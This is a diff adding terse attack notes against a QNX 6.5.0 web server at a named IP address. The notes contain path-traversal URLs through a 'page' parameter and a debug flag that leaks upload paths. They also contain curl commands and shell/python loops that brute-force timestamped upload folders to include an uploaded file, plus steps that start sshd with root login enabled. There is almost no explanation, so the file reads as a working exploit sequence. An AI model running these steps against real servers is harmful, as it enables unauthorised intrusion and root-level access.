@@ -1,0 +1,70 @@
+http://107.189.94.25/?page=..
+http://107.189.94.25/?page=.
+
+http://107.189.94.252/?page=../www/index
+
+QNX 6.5.0 sp1
+
+errors/404.html
+errors/403.html
+errors/500.html
+
+pages/index.shtml
+pages/rooms
+pages/dives
+
+
+<!-- HTTP_ACCEPT_ENCODING = gzip, deflate -->
+<!-- POST_PATH = /uploads/AF827050162DF//data3a0c1014.0 -->
+<!-- REQUEST_URI = / -->
+<!-- path = ../pages/../www/index.shtml -->
+<!-- HTTP_ACCEPT_LANGUAGE = hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3 -->
+<!-- DEBUG = on -->
+<!-- HTTP_CONTENT_TYPE = application/x-www-form-urlencoded -->
+<!-- page = ../www/index -->
+<!-- SCRIPT_EXT = .shtml -->
+<!-- HTTP_USER_AGENT = Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0 -->
+<!-- METHOD = POST -->
+<!-- HTTP_REFERER = http://107.189.94.252/?page=contact -->
+<!-- HTTP_HOST = 107.189.94.252 -->
+<!-- HTTP_CONNECTION = keep-alive -->
+<!-- HTTP_ACCEPT = text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 -->
+<!-- POST_LENGTH = 26 -->
+<!-- HTTP_TEST_HEADER_PARAM = asd -->
+<!-- VERSION = HTTP/1.1 -->
+<!-- REMOTE_IP = ::ffff:80.112.130.175 -->
+<!-- HTTP_CONTENT_LENGTH = 26 -->
+
+
+Time based
+<!-- POST_PATH = /uploads/AF827050162DF//data3a0c1014.0 -->
+<!-- POST_PATH = /uploads/AF82705016579//data3a0c1014.0 -->
+<!-- POST_PATH = /uploads/AF827050165BA//data3a0c1014.0 -->
+<!-- POST_PATH = /uploads/AF82705016600//data3a0c1014.0 -->
+<!-- POST_PATH = /uploads/AF82705016607//data3a0c1014.0 -->
+
+
+
+curl -v "http://107.189.94.252/" -d "page=../www/index&DEBUG=on&alma=" | tail -n 30
+curl -v "http://107.189.94.252/?DEBUG=on&page=../uploads/AF82705016A60//data3a4bf014.0"
+
+for i in {10..25}; do time=`python -c 'import sys;base=0xAF82705016AB5;sys.stdout.write("%X" % (base+'$i'));'`; echo curl -v "http://107.189.94.252/?DEBUG=on&page=../uploads/$time/data3a4bf014.0" > "$time.html"; done
+for i in {15..25}; do time=`python -c 'import sys;base=0xAF82705017216;sys.stdout.write("%X" % (base+'$i'));'`; curl -v "http://107.189.94.252/?DEBUG=on&page=../uploads/$time/data3a88e014.0" > "$time.html"; done
+<@ if (page == "index") printf("%s", "class=\"active\""); @>
+
+
+
+QNX
+
+ssh-keygen -tdsa -f/etc/ssh/ssh_host_dsa_key
+ssh-keygen -trsa -f/etc/ssh/ssh_host_rsa_key
+Permitrootlogin yes
+/etc/rc.d/rc.locl /usr/sbin/sshd &
+
+
+
+target qnx qnx.mshome.net:8000
+
+fork doesn't work in qnx gdb:
+set follow-fork-mode child
+set detach-on-fork off
